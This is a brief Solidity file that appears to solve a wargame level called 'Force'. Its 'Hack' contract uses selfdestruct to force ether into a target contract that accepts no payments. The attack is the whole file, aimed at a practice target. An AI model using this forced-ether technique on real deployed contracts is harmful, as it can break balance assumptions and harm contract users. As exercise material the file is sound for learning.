// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Force {/*
                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}
contract Hack  {

  // Self destruct destroys the contract and send all the balance to a given a address 
    function hack(address addr) public payable {
      require(msg.value > 0, "Send some eth");
      selfdestruct(payable(addr));
    }

    receive() external payable {

    }

    fallback() external payable {

    }
}
